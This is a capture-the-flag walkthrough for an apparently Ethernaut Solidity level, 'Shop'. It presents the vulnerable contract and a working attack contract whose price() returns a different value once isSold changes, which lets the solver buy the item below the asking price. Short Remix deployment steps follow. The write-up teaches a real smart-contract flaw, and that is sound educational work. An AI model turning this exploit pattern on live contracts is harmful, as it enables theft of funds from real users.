# 21 Shop

```
Сan you get the item from the shop for less than the price asked?

Things that might help:
Shop expects to be used from a Buyer
Understanding restrictions of view functions
```
####  code
```

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Buyer {
  function price() external view returns (uint);
}

contract Shop {
  uint public price = 100;
  bool public isSold;

  function buy() public {
    Buyer _buyer = Buyer(msg.sender);

    if (_buyer.price() >= price && !isSold) {
      isSold = true;
      price = _buyer.price();
    }
  }
}


```




#### Start 


### (1) `get the item from the shop for less than the price asked`

We need to focus code on the part changes parameter `price`

```
if (_buyer.price() >= price && !isSold) {
      isSold = true;
      price = _buyer.price();
    }
```

which must pass conditions  `if (_buyer.price() >= price && !isSold) `

If we look closely, we can see that `_buyer` is an externall contract which we can attack from here.

We need to create a contract where the first call to `_buyer.price()` must be >= 100  and the second call must be < 100

how do we do that ?

.

.

.


.

We can see  in `if` the variable value has been changed  `isSold = true;` We can use this as a reference when 

the first `_buyer.price()` call has passed.

#### This is the code I used 
```

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Shop  {
	function buy() external;
    function isSold() external view returns (bool);
}


contract AtkShop {

    Shop public target ;

    constructor (address _target) {
      target = Shop(_target);
    }


    function price() external view returns (uint256){
     if( target.isSold() ){
        return 99;
      } else {
        return  101;
      }
    
    }

    function callBuy() external {
        target.buy();
    }


    
}
```


- ` constructor (address _target) `

    This constructor  set  address target  to attack
    
    input parameters   `_target` is address contract Shop      

- ` function price() external view returns (uint256)`

    This function when  isSold == false will return  101 and if isSold == true  will return  99

- ` function callBuy() external `

    This function will call  `function buy() public` in contract Shop


Use the remix deploy contract `AtkShop ` 

Call `function callBuy() external `  and confirm transaction 


Click button Submit instance and confirm transaction 

# !!! we passed !!!

